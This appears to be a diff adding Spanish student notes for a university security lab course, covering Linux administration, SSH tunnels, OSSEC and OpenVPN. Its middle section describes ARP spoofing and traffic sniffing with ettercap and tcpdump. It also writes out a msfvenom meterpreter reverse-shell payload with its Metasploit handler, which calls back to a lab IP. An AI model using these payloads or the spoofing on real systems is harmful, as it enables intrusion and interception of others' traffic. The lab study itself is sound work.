@@ -1,0 +1,266 @@
+DEFENSA LSI
+-------------------------
+a)
+service --status-all
+
+b) lsb_release -a
+
+c)
+systemctl get-default
+systemctl set-default blabla.target
+systemctl list-unit-files -all
+systemctl list-units --type=target
+systemctl list-units --type=service
+
+d)
+systemd-analyze time
+systemd-analyze blame
+systemd-analyze critical-chain
+
+e)
+journalctl -b
+
+f) 
+ip addr -> informacion
+ifconfig ens34:1 10.11.52.1/24
+ifconfig ens34:1 up
+ifconfig
+reboot
+
+g) ip route add 10.11.50.128 via 10.11.48.1 dev ens33
+ip route
+ip route del 10.11.50.128
+traceroute -l 10.11.50.128
+
+h)
+
+i)
+cd /etc (se mete en motd)
+nano script.sh
+chmod +x script.sh
+cd /etc/init.d
+nano service
+chmod +x /etc/init.d/service
+update-rc.d service defaults
+
+j)
+netstat
+netstat -tupn -> conexiones establecidas
+netstat -natp -> puertos escuchando
+
+k)
+who
+top -> tareas que consumen mas recursos
+watch netstat -c -> informacion sobre conexiones
+
+l) apt-cache rdepends libwrap0
+
+m) 
+
+n)
+nano /etc/sysctl.conf
+net.ipv6.conf.all.disable_ipv6 = 1 
+net.ipv6.conf.default.disable_ipv6 = 1 
+net.ipv6.conf.lo.disable_ipv6 = 1 
+
+A)
+
+B)
+
+C)
+
+D)
+uname -a -> kernel actual
+dpkg --list | grep linux-image
+----------------------------------------------------------------
+PRACTICA 2
+
+https://www.mankier.com/8/ettercap
+
+a)
+arp -a -> en la maquina de la victima tiene la MAC del atacante como direccion de la IP del servidor
+
+si no activas remote, sniffas la paqueteria entre la maquina y la gateway, si quieres sniffar paqueteria que pase a traves de 
+la gateway debes activar remote
+
+primero hacemos el tcpdump y despues el otro hace el curl
+
+pulsar 'h' mientras sniffeo para ver opciones
+
+mientras estoy sniffing, pulsar <space> para activar la vision del flujo de paquetes
+
+oneway sirve para infectar solo desde target1 a target2 y no al reves. Util si quieres infectar la maquina pero no el router
+
+para infectar varios targets en modo silencioso usar -j para cargar un fichero con una 
+
+b)
+
+c)
+ping [IP]
+arp -a -> lista todas las IPs de mi tabla con sus respectivas MACs
+
+nmap -sP -oN logfile-txt 10.11.48.0/24
+
+d)
+ping6 -c2 ff02::1
+
+e)
+tcpdump -D -> muestra las posibles fuentes de las que obtiene informacion tcpdump
+
+arp -a | grep "[mi MAC]" -> si estoy spoofeando a mi compañero deberia aparecer 10.11.48.1 at [mi MAC]
+
+tcpdump -n net [net, por ejemplo 10.11] -> -n sirve para filtrar, por ejemplo por net -> añadir src despues de -n para filtrar por source
+	    port [nº puerto] | portrange [nº puerto min]-[nº puerto max]
+	    host [IP host]
+
+tcpdump -n -A -> imprime packetes ASCII
+	    -X  -> packetes hexadecimales
+
+f)
+g)
+
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.48.128 lport=1234 -f elf -o cute-dolphin
+chmod +x cute-dolphin
+mfsconsole
+> use exploit/multi/handler
+> set payload linux/x64/meterpreter_reverse_tcp
+> set lhost 10.11.48.128
+> set lport 1234
+> exploit
+
+scp lsi@[IP a conectarse]:[path del archivo a pasar] [path para guardar el archivo, . en este caso]
+
+-----------------------------------------------------------------------------------------------------------------
+
+./prometheus --config.file=prometheus.yml
+
+./node_exporter --web.listen-address 127.0.0.1:9100
+
+systemctl start grafana-server
+
+nmap -> host discovery
+
+nmap -sP -> MAC
+
+nmap -a -> fingerprinting
+
+nmap -p  1-65535
+
+
+
+-c -> num conexiones
+
+-g ->
+
+-o -> nombre
+
+-i -> intervalo entre followup data
+
+-r -> conexions por segundo
+
+-x -> longitud maxima del nombre randomizado
+
+-p -> tiempo de espera para respuesta HTTP
+
+
+Direccionamiento ipv4/v6 UDC
+whois -h whois.ripe.net UDC
+
+
+Dominios UDC
+nmap --script hostmap-crtsh.nse udc.es
+
+Alertas OSSEC 
+cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a
+
+Solo fallos autenticacion
+cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a |/var/ossec/bin/ossec-reportd -f group authentication_failures
+----------------------------------------------------------------------------------------------------
+PRACTICA 3
+
+1.a)
+ssh_known_hosts guarda las claves publicas de los servidores a los que me he conectado por ssh, la primera vez que me conecto intercambio
+las claves publicas, la siguiente vez, comparo la clave del servidor en el fichero ssh_known_hosts con la presentada por el servido
+
+c)
+En windows:
+
+ssh-keygen
+
+copiar las claves en la maquina virtual
+
+nano authorized_keys
+
+chmod -R go= ~/.ssh (elimina permisos de grupo y blabla en esa carpeta)
+
+copiar la clave publica en authorized_keys (en nuestro caso tendremos nuestra propia clave publica en authorized keys ya que es la 
+	misma que la que generamos en windows y queremos pode conectarnos desde windows directamente
+
+En maquina virtual:
+
+ssh-copy-id lsi@10.11.48.123
+
+LISTO, ya puedo conectarme desde windows a mi maquina virtua, desde mi maquina virtual a la de mi compañero y desde windows
+	a la maquina virtual de mi compañero, ya que la clave publica de mi maquina y windows son la misma
+
+nano /etc/ssh/sshd_config -> PasswordAuthentication no
+
+Ahora solo estará disponible la conexion por clave ssh y no por contraseña 
+
+d)
+https://www.raulprietofernandez.net/blog/gnu-linux/como-crear-un-tunel-ssh-en-gnu-linux
+
+https://universo-digital.net/configurando-tuneles-ssh-locales-remotos-dinamicos/
+
+https://www.sombreroblanco.es/2018/10/tunel-ssh-for-dummies-una-explicacion-sencilla/
+
+/etc/ssh/sshd_config -> AllowTcpForwarding yes
+
+ssh -f -N -L [10.11.48.128:]4343:10.11.48.128:80 lsi@10.11.48.123 (-f -> background, -N -> no abrir shell, -L para usar local port
+									             -R remoto
+									             -D dinamico)
+
+El primer [10.11.48.128:] es opcional para indicar la ip que quieres usar, si te conectas a tu maquina desde windows es necesario
+
+indico el puerto que quiero usar en mi maquina -> 4343
+
+Indico el servidor al que quiero conectarme -> 10.11.48.128
+
+Indico a que puerto del servidor conectarme -> 80 generalmente, si es pagina https, el 443
+
+Indico a traves de que maquina me conecto -> lsi@10.11.48.123
+
+REMOTO:
+
+ssh -N -R [10.11.48.128:]4343:10.11.48.128:80 lsi@10.11.48.123 -> en este caso le estoy diciendo que abra el puerto 4343 en 10.11.48.123 y que todos
+					los que se conecten a ese puerto los redirija al puerto 80 de 10.11.48.128
+
+DINAMICO:
+
+ssh -N -D [10.11.48.128:]4343 lsi@10.11.48.123 -> abre el puerto 4343 en nuestra maquina, lo conecta al servidor ssh y para todas las busquedas
+					que hagamos, nos crea un tunel automaticamente
+
+
+3)
+autoridad certificadora? -> https://howtoforge.es/como-instalar-y-configurar-un-servidor-openvpn-en-debian-12/
+
+Llegué al paso 5
+
+VAMOS OSTIA PUTA -> 27/11/2023 18:58 
+
+el que tenga el certificado de la CA en su maquina puede acceder a cualquier sitio que tenga firmado por esa CA el certificado de la
+	pagina web
+
+Si yo tengo el certificado de la CA de parada en mi maquina, puedo acceder a su servidor apache cuñado con su CA
+
+
+
+
+
+
+
+
+
+
+
+
